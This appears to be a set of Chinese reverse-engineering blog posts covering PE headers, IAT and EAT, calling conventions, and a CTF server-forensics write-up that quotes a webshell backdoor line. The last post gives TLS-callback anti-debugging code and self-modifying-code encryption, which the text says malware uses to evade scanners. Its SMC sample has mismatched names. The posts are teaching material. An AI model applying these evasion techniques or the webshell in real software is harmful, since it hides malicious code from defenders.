结构体组成的数组，每个结构体对应一个节区。 1234567891011121314151617# define IMAGE_SIZEOF_SHORT_NAME 8typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 区块的名称，如 “.text” union &#123; DWORD PhysicalAddress; // 物理地址 DWORD VirtualSize; // 真实长度，这两个值是一个联合结构，可以使用其中的任何一个，一般是取后一个 &#125; Misc; DWORD VirtualAddress; // 节区的 RVA 地址 DWORD SizeOfRawData; // 在文件中对齐后的尺寸 DWORD PointerToRawData; // 在文件中的偏移量 DWORD PointerToRelocations; // 在 OBJ 文件中使用，重定位的偏移 DWORD PointerToLinenumbers; // 行号表的偏移（供调试使用地) WORD NumberOfRelocations; // 在 OBJ 文件中使用，重定位项数目 WORD NumberOfLinenumbers; // 行号表中行号的数目 DWORD Characteristics; // 节属性如可读，可写，可执行等&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 下表中列出了 IMAGE_SECTION_HEADER 结构体中要了解的重要成员（不使用其他成员）。 项目 含义 VirtualSize 内存中节区所占大小 VirtualAddress 内存中节区起始地址（RVA） SizeOfRawData 磁盘文件中节区所占大小 PointerToRawData 磁盘文件中节区起始位置 Characteristics 节区属性（bit OR） VirtualAddress 与 PointerToRawData 不带有任何值，分别由（定义在 IMAGE_OPTIONAL_HEADER32 中的）SectionAlignment 与 FileAlignment 确定。 VirutalSize 与 SizeOfRawData 一般具有不同的值，即磁盘文件中节区的大小与加载到内存中的节区大小是不同的。 Characteristics 由以下代码中现实的值组合（bit OR）而成。 123456#define IMAGE_SCN_CNT_CODE 0x00000020 // Section contains code.#define IMAGE_SCN_CNT_INITIALIZED_DATA 0x00000040 // Section contains initialized data.#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080 // Section contains uninitialized data.#define IMAGE_SCN_MEM_EXECUTE 0x20000000 // Section is executable.#define IMAGE_SCN_MEM_READ 0x40000000 // Section is readable.#define IMAGE_SCN_MEM_WRITE 0x80000000 // Section is writable. 最后讲一下 Name 字段。Name 成员不像 C 语言中的字符串一样以 NULL 结束，并且没有 “必须使用 ASCII 值” 的限制。PE 规范未明确规定节区的 Name，所以可以向其中仿佛任何值，甚至可以填充 NULL 值。所以节区的 Name 仅供参考，不能保证其百分之百地被用作某种信息（数据节区的名称也可叫做 .code）。 各结构体成员如下。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[ IMAGE_SECTION_HEADER ] offset value description--------------------------------------------------------------------------000001D8 2E746578 Name (.text)000001DC 74000000000001E0 00007748 virtual size000001E4 00001000 RVA000001E8 00007800 size of raw data000001EC 00000400 offset to raw data000001F0 00000000 offset to relocations000001F4 00000000 offset to line numbers000001F8 0000 number of relocations000001FA 0000 number of line numbers000001FC 60000020 characteristics IMAGE_SCN_CNT_CODE IMAGE_SCN_MEM_EXECUTE IMAGE_SCN_MEM_READ00000200 2E646174 Name (.data)00000204 6100000000000208 00001BA8 virtual size0000020C 00009000 RVA00000210 00000800 size of raw data00000214 00007C00 offset to raw data00000218 00000000 offset to relocations0000021C 00000000 offset to line numbers00000220 0000 number of relocations00000222 0000 number of line numbers00000224 C0000040 characteristics IMAGE_SCN_CNT_INITIALIZED_DATA IMAGE_SCN_MEM_READ IMAGE_SCN_MEM_WRITE00000228 2E727372 Name (.rsrc)0000022C 6300000000000230 00008304 virtual size00000234 0000B000 RVA00000238 00008400 size of raw data0000023C 00008400 offset to raw data00000240 00000000 offset to relocations00000244 00000000 offset to line numbers00000248 0000 number of relocations0000024A 0000 number of line numbers0000024C 40000040 characteristics IMAGE_SCN_CNT_INITIALIZED_DATA IMAGE_SCN_MEM_READ 讲解 PE 文件时经常出现 “映像” （Image）这一术语。PE 文件加载到内存时，文件不会原封不动地加载，而要根据节区头中定义的节区起始地址、节区大小等加载。因此，磁盘文件中的 PE 与内存中的 PE 具有不同形态。将装载到内存中的形态称为 “映像” 以示区别。 RVA to RAWPE 文件加载到内存时，每个节区都要能准确完成内存骶椎与文件偏移间的映射。这种映射一般称为 RVA to RAW，方法如下。 查找 RVA 所在节区。 使用简单的公式计算文件偏移（RAW）。 根据 IMAGE_SECTION_HEADER 结构体，换算公式如下： 12RAW - PointerToRawData = RVA - VirtualAddress RAW = RVA - VirtualAddress + PointerToRawData IATIAT（Import Address Table，导入地址表）保存的内容与 Windows 操作系统的核心进程、内存、DLL 结构等有关。换句话说，只要理解了 IAT，就掌握了 Windows 操作系统的根基。简言之 IAT 是一种表格，用来记录程序正在使用哪些库中的哪些函数。 RVA 与 RAW（文件偏移）间的相互变换是 PE 头的最基本的内容。 DLLDLL（Dynamic Linked Library）撑起了整座 Windows OS 大厦，它被翻译成 “动态链接库”。 16 位的 DOS 时代不存在 DLL 这一概念，只有 “库”（Library）一说。比如在 C 语言中使用 printf() 函数时，编译器会先从 C 库中读取相应函数的二进制代码，然后插入（包含到）应用程序。也就是说，可执行文件中包含着 printf() 函数的二进制代码。Windows OS 支持多任务，若仍采用这种包含库的方式，会非常没有效率。Windows 操作系统使用了数量庞大的库函数（进程、内存、窗口、消息等）来支持 32 位的 Windows 环境。同时运行多个程序时，若仍像以前一样每个程序运行时都包含相同的库，将造成严重的内存浪费（当然磁盘空间的浪费也不容小嘘）。因此，Windows OS 设计者们根据需要引入了 DLL 这一概念，描述如下。 不要把库包含到程序中，单独组成 DLL 文件，需要时调用即可。 内存映射技术使加载后的 DLL 代码、资源在多个进程中实现共享。 更新库时只要替换相关 DLL 文件即可，简便易行。 加载 DLL 的方式实际有两种：一种是 “显式链接”（Explicit Linking），程序使用 DLL 时加载，使用完毕后释放内存；另一种是 “隐式链接”（Implicit Linking），程序开始时即一同加载 DLL，程序终止时再释放占用的内存。IAT 提供的机制即与隐式链接有关。接下来用 OllyDbg 打开 notepad.exe 来查看 IAT，下图是 CreateFileW() 函数的代码，该函数位于 kernel32.dll 中。 调用 CreateFileW() 函数时并非直接调用，而是通过获取 01001104 地址处的值来实现（所有 API 调用均采用这种方式）。 地址 01001104 是 notepad.exe 中 .text 节区的内存区域（更确切地说是 IAT 内存区域）。01001104 地址的值为 7C8107F0，而 7C8107F0 地址即是加载到 notepad.exe 进程内存中的 CreateFileW() 函数（位于 kernel32.dll 库中）的地址。 那么为什么不直接 CALL 7C8107F0 呢？事实上，notepad.exe 程序的制作者编译（生成）程序时，并不知道该 notepad.exe 程序运行在哪种 Windows（9X、2K、XP、Vista、7 等）、哪种语言（ENG、JPN、KOR 等）、哪种服务包（Service Pack）下。上面列举出的所有环境中，kernel32.dll 的版本各不相同，CreateFileW() 函数的位置（地址）也不相同。为了确保在所有环境中都能正常地调用 CreateFileW() 函数，编译器准备了要保存 CreateFileW() 函数实际地址的位置（01001104），并记下 CALL DWORD PTR DS:[01001104] 形式的指令。执行文件时，PE 装载器将 CreateFileW() 函数的地址写到 01001104 位置。 编译器不使用 CALL 7C8107F0 语句的另一个原因在于 DLL 重定位。DLL 文件的 ImageBase 值一般为 10000000。比如某个程序使用 a.dll 与 b.dll 时，PE 装载器先把 a.dll 装载到内存的 10000000（ImageBase）处，然后尝试把 b.dll 也装载到该处。但是由于该地址处已经装载了 a.dll，所以 PE 装载器查找其他空白的内存空间（ex：3E000000），然后将 b.dll 装载进去。 这就是所谓的 DLL 重定位，它使我们无法对实际地址硬编码。另一个原因在于，PE 头中表示地址时不使用 VA，而是 RVA。 实际操作中无法保证 DLL 一定会被加载到 PE 头内指定的 ImageBase 处。但是 EXE 文件（生成进程的主体）却能准确加载到自身的 ImageBase 中，因为它拥有自己的虚拟空间。 PE 头的 IAT 是代码逆向分析的核心内容。 IMAGE_IMPORT_DESCRIPTORIMAGE_IMPORT_DESCRIPTOR 结构体中记录着 PE 文件要导入哪些库文件。 Import：导入，向库提供服务（函数）。Export：导出，从库向其他 PE 文件提供服务（函数）。 IMAGE_IMPORT_DESCRIPTOR 结构体如下所示。 123456789101112131415typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristiics; DWORD OriginalFirstThunk; // INT(Import Name Table) address (RVA) &#125; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; // library name string address (RVA) DWORD FirstThunk; // IAT(Import Address Table) address (RVA)&#125; IMAGE_IMPORT_DESCRIPTOR;typedef struct _IMAGE_IMPORTBY_NAME &#123; WORD Hint; // ordinal BYTE Name[1]; // function name string&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; 执行一个普通程序时往往需要导入多个库，导入多少库就存在多少个 IMAGE_IMPORT_DESCRIPTOR 结构体，这些结构体形成了数组，且结构体数组最后以 NULL 结构体结束。IMAGE_IMPORT_DESCRIPTOR 中重要的成员如下表所示（拥有全部 RVA 值）。 项目 含义 OriginalFirstThunk INT 的地址（RVA） Name 库名称字符串的地址（RVA） FirstThunk IAT 的地址（RVA） PE 头中提到的 “Table” 即指数组。INT 与 IAT 是长整型（4 个字节数据类型）数组，以 NULL 结束（未另外明确指出大小）。INT 中各元素的值为 IMAGE_IMPORT_BY_NAME 结构体指针（有时 IAT 也拥有相同的值）。INT 与 IAT 的大小应相同。 下图为 notepad.exe 之 kernel32.dll 的 IMAGE_IMPORT_DESCRIPTOR 结构。 INT 与 IAT 的各元素同时指向相同地址，但也有很多情况下它们是不一致的。 下面为 PE 装载器把导入函数输入之 IAT 的顺序。 读取 IID 的 Name 成员，获取库名称字符串（“kernel32.dll”）。 装载相应库。-&gt; LoadLibrary(&quot;kernel32.dll&quot;) 读取 IID 的 OriginialFirstThunk 成员，获取 INT 地址。 逐一读取 INT 中数组的值，获取相应 IMAGE_IMPORT_BY_NAME 地址（RVA）。 使用 IMAGE_IMPORT_BY_NAME 的 Hint（ordinal）或 Name 项，获取相应函数的起始地址。-&gt; GetProcAddress(&quot;GetCurrentThreadld&quot;) 读取 IID 的 FirstThunk（IAT）成员，获得 IAT 地址。 将上面获得的函数地址输入相应 IAT 数组值。 重复以上步骤 4~7，直到 INT 结束（遇到 NULL 时）。 EATWindows 操作系统中，“库” 是为了方便其他程序调用而集中包含相关函数的文件（DLL/SYS）。Win32 API 是最具代表性的库，其中的 kernel32.dll 文件被称为最核心的库文件。 EAT 是一种核心机制，它使不同应用程序可以调用库文件中提供的函数。也就是说，只有通过 EAT 才能准确求得从相应库中导出函数的起始地址。与 IAT 一样，PE 文件内的特定结构体（IMAGE_EXPORT_DIRECTORY）保存着导出信息，且 PE 文件中仅有一个用来说明库 EAT 的 IMAGE_EXPORT_DIRECTORY 结构体。 用来说明 IAT 的 IMAGE_IMPORT_DESCRIPTOR 结构体以数组形式存在，且拥有多个成员。这样是因为 PE 文件可以同时导入多个库。 可以在 PE 文件的 PE 头查找到 IMAGE_EXPORT_DIRECTORY 结构体的位置。IMAGE_OPTIONAL_HEADER32.DataDirectory[0].VirtualAddress 值即是 IMAGE_EXPORT_DIRECTORY 的起始地址（也是 RVA 的值）。 下图显示的是 kernel32.dll 文件的 IMAGE_OPTIONAL_HEADER32.DataDirectory[0]（第一个 4 字节为 VirtualAddress，第二个 4 字节为 Size 成员）。 IMAGE_OPTIONAL_HEADER32.DataDirectory 结构体数组信息整理如下表。 偏移 值 说明 00000160 00000000 loader flags 00000164 00000010 number of directories 00000168 0000262C RVA of EXPORT Directory 0000016C 00006D19 size of EXPORT Directory 00000170 00081898 RVA of IMPORT Directory 00000174 00000028 size of IMPORT Directory 由于 RVA 值为 262C，所以文件偏移为 1A2C。 IMAGE_EXPORT_DIRECTORYIMAGE_EXPORT_DIRECTORY 结构体如下。 12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; DWROD TimeDateStamp; // creation time date stamp WORD MajorVersion; WORD MinorVersion; DWORD Name; // address of library file name DWORD Base; // ordinal base DWORD NumberOfFunctions; // number of functions DWORD NumberOfNames; // number of names DWORD AddressOfFunctions; // address of function start address array DWORD AddressOfNames; // address of function name string array DWORD AddressOfNameOrdinals; // address of ordinal array&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 下表为其中的重要成员（全部地址均为 RVA）。 项目 含义 NumberOfFunctions 实际 Export 函数的个数 NumberOfNames Export 函数中具名的函数个数 AddressOfFunctions Export 函数地址数组（数组元素个数=AddressOfFunctions） AddressOfNames 函数名称地址数组（数组元素个数=AddressOfNames） AddressOfNameOrdinals Ordinal 地址数组（数组元素个数=AddressOfNames） 下图是 kernel32.dll 文件的 IMAGE_EXPORT_DIRECTORY 结构体与整个 EAT 结构。 从库中获得函数地址的 API 为 GetProcAddress() 函数。该 API 引用 EAT 来获取指定 API 的地址。GetProcAddress() API 拥有函数名称，以下为它获取函数地址的过程。 利用 AddressOfNames 成员转到 “函数名称数组”。 “函数名称数组” 中存储着字符串地址。通过比较（strcmp）字符串，查找指定的函数名称（此时数组的索引称为 name_index）。 利用 AddressOfNameOrdinals 成员，转到 ordinal 数组。 在 ordinal 数组中通过 name_index 查找相应的 ordinal 值。 利用 AddressOfFunctions 成员转到 “函数地址数组”（EAT）。 在 “函数地址数组” 中将刚刚求得的 ordinal 用作数组索引，获得指定函数的起始地址。 kernel32.dll 中所有导出函数均有相应名称，AddressOfNameOrdinals 数组的值以 index=ordinal 的形式存在。但并不是所有的 DLL 文件都如此。导出函数中也有一些函数没有名称（仅通过 ordinal 导出），AddressOfNameOrdinals 数组的值为 index!=ordinal。所以只有按照上面的顺序才能获得准确的函数地址。 对于没有函数名称的导出函数，可以通过 Ordinal 查找到它们的地址。从 Ordinal 值中减去 IMAGE_EXPORT_DIRECTORY.Base 成员后得到一个值，使用该值作为 “函数地址数组” 的索引，即可查找到相应函数的地址。 Reference《逆向工程核心原理》https://bbs.pediy.com/thread-247114.htmhttps://bbs.pediy.com/thread-247303.htm","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"}]},{"title":"RE入门（二）","slug":"RE入门（二）","date":"2019-01-27T03:54:09.000Z","updated":"2019-11-07T01:50:56.883Z","comments":true,"path":"2019/01/27/RE入门（二）/","link":"","permalink":"qianfei11.coding.me/2019/01/27/RE入门（二）/","excerpt":"了解一些 VB 的特性以及一些简单的的函数调用约定。","text":"了解一些 VB 的特性以及一些简单的的函数调用约定。 Visual BasicVB 专用引擎VB 文件使用名为MSVBVM60.dll（Microsoft Visual Basic Machine 6.0）的 VB 专用引擎（也称为 The Thunder Runtime Engine）。 举个使用 VB 引擎的例子，显示消息框时，VB 代码中要调用MsgBox()函数。其实，VB 编辑器真正调用的是MSVBVM60.dll里的rtcMsgBox()函数，在该函数内部通过调用user32.dll里的MessageBoxW()函数（Win32 API）来工作（也可以在 VB 代码中直接调用user32.dll里的MessageBoxW()）。 本地代码和伪代码根据使用的编译选项的不同，VB 文件可以编译为本地代码（N code）与伪代码（P code）。本地代码一般使用易于调试器解析的 IA-32 指令；而伪代码是一种解释器（Interpreter）语言，它使用由 VB 引擎实现虚拟机并可自解析的指令（字节码）。因此，若想准确解析 VB 的伪代码，就需要分析 VB 引擎并实现模拟器。 伪代码具有与 Java（Java 虚拟机）、Python（Python 专用引擎）类似的形态结构。使用伪代码的好处是非常方便代码移植（编写/发布针对特定平台的引擎，用户代码借助它几乎可以不加任何修改地在制定平台上运行）。 事件处理程序VB 主要来编写 GUI 程序，IDE 用户界面本身也最适合于 GUI 编程。由于 VB 程序采用 Windows 操作系统的事件驱动方式工作，所以在main()或WinMain()中并不存在用户代码（希望调试的代码），用户代码存在于各个事件处理程序（event handler）之中。 函数调用约定cdeclcdecl是主要在 C 语言中使用的方式，调用者负责处理栈。 1234567891011#include \"stdio.h\"int add(int a, int b)&#123; return (a + b);&#125;int main(int argc, char *argv[])&#123; return add(1, 2);&#125; 使用 VC++（关闭优化选项）编译代码生成cdecl.exe，使用 OllyDbg 调试。 从 401000~401020 地址间的代码可以发现，add()函数的参数 1、2 以逆序的方式入栈，调用add()函数（401000）后，使用ADD ESP,8命令整理栈。调用者main()函数直接清理其压入栈的函数参数，这样的方式是cdecl。 1234567891011121314151617181900401000 /$ 55 PUSH EBP ; # add00401001 |. 8BEC MOV EBP,ESP00401003 |. 8B45 08 MOV EAX,[ARG.1]00401006 |. 0345 0C ADD EAX,[ARG.2]00401009 |. 5D POP EBP0040100A \\. C3 RETN0040100B CC INT30040100C CC INT30040100D CC INT30040100E CC INT30040100F CC INT300401010 /$ 55 PUSH EBP ; # main00401011 |. 8BEC MOV EBP,ESP00401013 |. 6A 02 PUSH 0x2 ; / Arg2 = 0000000200401015 |. 6A 01 PUSH 0x1 ; | Arg1 = 0000000100401017 |. E8 E4FFFFFF CALL cdecl.00401000 ; \\ cdecl.004010000040101C |. 83C4 08 ADD ESP,0x80040101F |. 5D POP EBP00401020 \\. C3 RETN cdecl方式的好处在于它可以像 C 语言的printf()函数一样，向被调用函数传递长度可变的参数。这种长度可变的参数在其他调用约定中很难实现。 stdcallstdcall方式常用于 Win32 API，该方式由被调用者清理栈。C 语言默认的函数调用方式为cdecl。若想使用stdcall方式编译源码，只要使用_stdcall关键字即可。 1234567891011#include \"stdio.h\"int _stdcall add(int a, int b)&#123; return (a + b);&#125;int main(int argc, char *argv[])&#123; return add(1, 2);&#125; 使用 VC++（关闭优化选项）编译代码生成stdcall.exe文件后，使用 OllyDbg 调试。从代码中可以看到，在main()函数中调用add()函数后，省略了清理栈的代码（ADD ESP,8）。 栈的清理工作由add()函数中最后（40100A）的RETN 8命令来执行。RETN 8命令的含义为 RETN+POP 8 字节，即返回后使 ESP 增加到指定大小。 1234567891011121314151600401000 /$ 55 PUSH EBP ; # add00401001 |. 8BEC MOV EBP,ESP00401003 |. 8B45 08 MOV EAX,[ARG.1]00401006 |. 0345 0C ADD EAX,[ARG.2]00401009 |. 5D POP EBP0040100A \\. C2 0800 RETN 0x80040100D CC INT30040100E CC INT30040100F CC INT300401010 /$ 55 PUSH EBP ; # main00401011 |. 8BEC MOV EBP,ESP00401013 |. 6A 02 PUSH 0x2 ; / Arg2 = 0000000200401015 |. 6A 01 PUSH 0x1 ; | Arg1 = 0000000100401017 |. E8 E4FFFFFF CALL stdcall.00401000 ; \\ stdcall.004010000040101C |. 5D POP EBP0040101D \\. C3 RETN 像这样在被调用者add()函数内部清理栈的方式即为stdcall方式。stdcall方式的好处在于，被调用者函数内部存在着栈清理代码，与每次调用函数时都要用ADD ESP,XXX命令的cdecl方式相比，代码尺寸要小。虽然 Win32 API 是使用语言编写的库，但它使用的是stdcall方式，而不是 C 语言默认的cdecl方式。这是为了更好的兼容性，使 C 语言之外的其他语言（Delphi（Pascall）、Visual Basic 等）也能直接调用 API。 fastcallfastcall方式与stdcall方式基本类似，但该方式通常会使用寄存器（而非栈内存）去传递那些需要传递给函数的部分参数（前 2 个）。若某函数有 4 个参数，则前 2 个参数分别使用 ECX、EDX 寄存器传递。 顾名思义，fastcall方式的优势在于可以实现对函数的快速调用（从 CPU 的立场看，访问寄存器的速度要远比内存快得多）。单从函数调用本身来看，fastcall方式非常快，但是有时需要额外的系统开销来管理 ECX、EDX 寄存器。倘若调用函数前 ECX 与 EDX 中存有重要数据，那么使用它们前必须先备份。此外，如果函数本身很复杂，需要 ECX、EDX 寄存器用作其他用途时，也需要将它们中的参数值存储到另外某个地方。 References《逆向工程核心原理》https://www.jianshu.com/p/85a76f630c95https://bbs.pediy.com/thread-224583.htm","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"}]},{"title":"2018-信息安全铁人三项赛总决赛-数据赛","slug":"2018-信息安全铁人三项赛总决赛-数据赛","date":"2018-12-08T11:44:17.000Z","updated":"2019-08-26T01:14:57.554Z","comments":true,"path":"2018/12/08/2018-信息安全铁人三项赛总决赛-数据赛/","link":"","permalink":"qianfei11.coding.me/2018/12/08/2018-信息安全铁人三项赛总决赛-数据赛/","excerpt":"第一次参加铁三，这次总决赛中的数据赛不再是之前的看数据包，而是直接给了一台 web 服务器溯源。","text":"第一次参加铁三，这次总决赛中的数据赛不再是之前的看数据包，而是直接给了一台 web 服务器溯源。 经验总结第一次接触，全队也就自己一个人在做，挖了坑也填了坑，记录一下。 服务器给的是命令行界面，不用想着变成图形界面来操作。因为我init 5变成图形界面后发现完全没法操作…后来为了变回去我误以为是init 0，直接把服务器关了…后来只能让让主办方帮忙重启一下，差点被扣分… 刚开始的时候我主要目标是在每个用户的家目录以及 web 服务的根目录下查看是否有一些隐藏文件，\b 还是可以收集到一些重要信息的。 然后在数据库的目录下也可以发现一些信息。 之后慢慢发现最重要其实是 web 服务下的一些 log 文件，记录了黑客对服务器攻击的主要过程。 后来我还发现在每个用户家目录下的.bash_history也是很有用的，可以看到黑客提权后干的事情。 查看文件的话，建议用less -mN filename，因为纯命令行的界面不能滚屏，用less就会方便很多。 刚登上服务器建议lastlog一下，看看除了 root 用户之外其他用户最后一次是什么时候登陆的。 其他命令的话，常用grep肯定是没错的… 然后比赛的时候也找了两篇关于服务器溯源的文章，记录一下： https://www.freebuf.com/articles/web/138867.html https://www.freebuf.com/articles/rookie/179638.html 比赛的时候因为我们队排名在后来不是很靠前，然后我信息的收集也不是很到位，第一题怕做错会扣分，万一我们连三等奖都拿不到了，就没敢做。比赛结束后才知道每个队伍都会获奖… \b 溯源过程记录题目差不多是这样：黑客在内网中拿到了两台肉鸡，然后通过这两台肉鸡对一台服务器进行了攻击，我们则需要对这台服务器溯源取证分析，并且找到黑客留下的后门。 刚拿到服务器，先在 \b 在 root 的家目录下查看了一下隐藏文件，没想到一下子就有收获： 在这里一下子就拿到了数据库的账号和密码。 然后尝试登陆一下数据库，发现有一个seacms的数据库，然后进去之后发现一些重要的信息： 看完数据库，我就去查了一下关于海洋 cms 的洞： https://www.freebuf.com/vuls/150042.html https://www.jianshu.com/p/ebf156afda49 大概知道了是在 web 根目录下的search.php中存在漏洞，然后通过分析黑客可能用来攻击的脚本，大概知道了攻击过程。 我这里还把search.php记录下来了： 在 web 目录下还看到了一个360safe，就截了张图： 然后我看了一下每个用户家目录下的.bash_history，正常的用户simple以及黑客创建的hacker都没啥，主要是 root 的.bash_history： 大概收集了这些，也能推断出黑客拿到权限后新建了一个叫 hacker 的用户，然后黑客的操作是从什么时候开始的也无法判断。再grep一下： 下一步我就开始看日志，通过对.bash_history的阅读，判断主要是在/var/log/httpd下和/var/www/html/logs下的 log 文件： 然后就开始对 log 文件一行一行看下来： 基本看到几个 ip： 在后面一点的时候会看到192.168.12.173，通过 GET 的 url 很容易判断出在用脚本打网站： 最后看到可以黑客在放后门eval($_POST[cmd])： 大概的分析就是这样，中间也踩了很多坑。我最后的判断是： IP IDENTITY OPERATING SYSTEM 192.168.31.119 admin windows 192.168.12.129 victim windows 192.168.12.173 bot windows 192.168.12.156 bot windows 192.168.12.125 bot android 192.168.31.73 bot android 感觉自己整体分析下来应该方向是没错的，可能因为自己没学过计网，对一些网络的 \b 协议和请求方式没有了解很透彻，导致比赛的时候第一题问两台肉鸡的 ip 就判断错了，然后就没敢做下去…","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护","slug":"绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护","date":"2018-12-08T04:37:41.000Z","updated":"2019-09-09T04:44:35.469Z","comments":true,"path":"2018/12/08/绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护/","link":"","permalink":"qianfei11.coding.me/2018/12/08/绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护/","excerpt":"main 函数前有什么？","text":"main 函数前有什么？ TLS什么是 TLSTLS（Thread Local Storage）回调函数是每当创建/终止进程的线程时会自动调用执行的函数。创建的主线程也会自动调用回调函数，且其调用执行先于 EP（Entry Point）代码。功能就是把 PE 文件的 TEXT 段进行加密，隐藏他的静态代码段特性，在运行的时候抢在 main 函数执行之前把代码段直接在内存里面解密（不然就崩溃了），从而达到静态代码隐藏功能。 编写 TLS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;windows.h&gt;#include&lt;stdio.h&gt;#include &lt;winnt.h&gt;#include &lt;stdlib.h&gt;//使用 TLS 回调函数#include &lt;tlhelp32.h&gt;//使用 TLS 的宏#pragma comment(linker, \"/INCLUDE:__tls_used\")void lookupprocess() &#123; PROCESSENTRY32 pe32; pe32.dwSize = sizeof(pe32); HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // 在快照中包含系统中所有的进程 BOOL bMore = Process32First(hProcessSnap, &amp;pe32); // 获得第一个进程的句柄 while (bMore) &#123; _wcslwr_s(pe32.szExeFile, wcslen(pe32.szExeFile)+1); if (!wcscmp(pe32.szExeFile, L\"ollyice.exe\")) &#123; printf(\"///////WARNING///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"ollydbg.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"peid.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"ida.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"idaq.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; bMore = Process32Next(hProcessSnap, &amp;pe32); // 获取下一个进程的句柄 &#125; CloseHandle(hProcessSnap);&#125;void Debugger(void) &#123; int result = 0; __asm &#123; mov eax, dword ptr fs:[30h] ; TEB偏移30H处 movzx eax, byte ptr ds:[eax + 2h] ; 取PEB中BeingDebug，若为1则被调试 mov result, eax &#125; if (result) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125;&#125;void NTAPI tls_callback(PVOID h, DWORD reason, PVOID pv) &#123; lookupprocess(); Debugger(); MessageBox(NULL, L\"Not_Main_this_is_tls!\", L\"tls\", MB_OK); return;&#125;#pragma data_seg(\".CRT$XLB\")PIMAGE_TLS_CALLBACK p_thread_callback[] = &#123; tls_callback, 0 &#125;;#pragma data_seg()int main() &#123; MessageBox(NULL, L\"Main!\", L\"ESE\", MB_OK); return 0;&#125; 调试 TLS把有 TLS 保护的程序拖进 ida 分析，会看到 main 函数其实是空的： 1234int __cdecl main(int argc, const char **argv, const char **envp)&#123; return 0;&#125; 在 start（也就是 entry point）处下断点调试： 发现程序依然执行了，说明程序在 entry point 之前运行了。 同时可以查看 entry point list（Ctrl+E），发现 ida 也已经反编译出了一个叫做TlsCallback_0()的函数： 查看一下该函数的反汇编代码： 12345678void __stdcall TlsCallback_0(int a1, int a2, int a3)&#123; if ( a2 == 1 ) &#123; MessageBoxA(0, Text, Caption, 0); ExitProcess(0); &#125;&#125; 这也是许多未知程序在逆向时，更建议在虚拟环境下运行的原因。 手动去除 TLSTlsCallback 函数的定义： 1234567891011typedef VOID(NTAPI *PIMAGE_TLS_CALLBACK) ( PVOID DllHandle, // 模块句柄，即加载地址 DWORD Reason, PVOID Reserved );其中reason有以下几种：(winNT.h)#define DLL_PROCESS_ATTACH 1 // 进程启动#define DLL_THREAD_ATTACH 2 // 线程启动#define DLL_THREAD_DETACH 3 // 线程退出#define DLL_PROCESS_DETACH 0 // 进程退出 可以参照之前写过的一片writeup SMC什么是 SMCSMC（Self Modifying Code）是一种将可执行文件中的代码或数据进行加密，防止别人使用逆向工程工具（比如一些常见的反汇编工具）对程序进行静态分析的方法，只有程序运行时才对代码和数据进行解密，从而正常运行程序和访问数据。计算机病毒通常也会采用 SMC 技术动态修改内存中的可执行代码来达到变形或对代码加密的目的，从而躲过杀毒软件的查杀或者迷惑反病毒工作者对代码进行分析。现在，很多加密软件（或者称为“壳”程序）为了防止 Cracker（破解者）跟踪自己的代码，也采用了动态代码修改技术对自身代码进行保护。要精准的定位某个函数非常麻烦，所以我们就要以区块为加密的基础单位。 12345void encrypt_func(char *start_addr, int len) &#123; for(int i = 0; i &lt; len; i++) &#123; *(start + i) ^= 0x88; &#125;&#125; 编写 SMC因为定位一个具体的函数很繁琐，所以我们选择直接定位一个节表。把敏感的代码放入节表中，然后在需要的时候进行解密，这就是 SMC 动态加密技术的精髓。将下面这行代码放在开始程序的开始（也就是 include 下面），主要是让 text 节区可以执行、读、写和分享： 1#pragma comment(linker, \"/SECTION:.text,ERWS\") 以下代码可以编译生成可执行文件，但是无法运行，因为ck()函数的地址已经被打乱。这时候就利用 OD 进行修改，载入生成的程序，当程序运行enccrpt_func()函数完成时，ck()就已经完成加密，然后将程序 dump 下来，这时就可以运行。若拿一开始的程序去静态看，是完全看不懂的。 1234567891011121314151617181920212223242526272829#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#pragma comment(linker, \"/SECTION:.text,ERWS\")void encrypt_func(char *start_addr, int len) &#123; for(int i = 0; i &lt; len; i++) &#123; // 这里对地址进行简单的加密 *(start + i) ^= 0x88; &#125;&#125;//需要保护的函数void ck() &#123; printf(\"this is a test of smc\");&#125;//加密数据结束的地址void end()&#123;&#125;int main() &#123; char *lp_s = 0; char *lp_e = 0; int len = 0; lp_s = (char *)ck; // 获取需要加密函数的起始地址 lp_e = (char *)end; // 获取需要加密函数的结束地址 len = lp_e - lp_s; enc(lp_s, len); // smc加密函数 ck();&#125; 解密 SMC 找到 smc 的加密函数，当运行完成 smc 解密函数时,将程序 dump 下来。 smc 对程序动态完全没有用，可以用 OD 来调试程序，找到受保护代码。 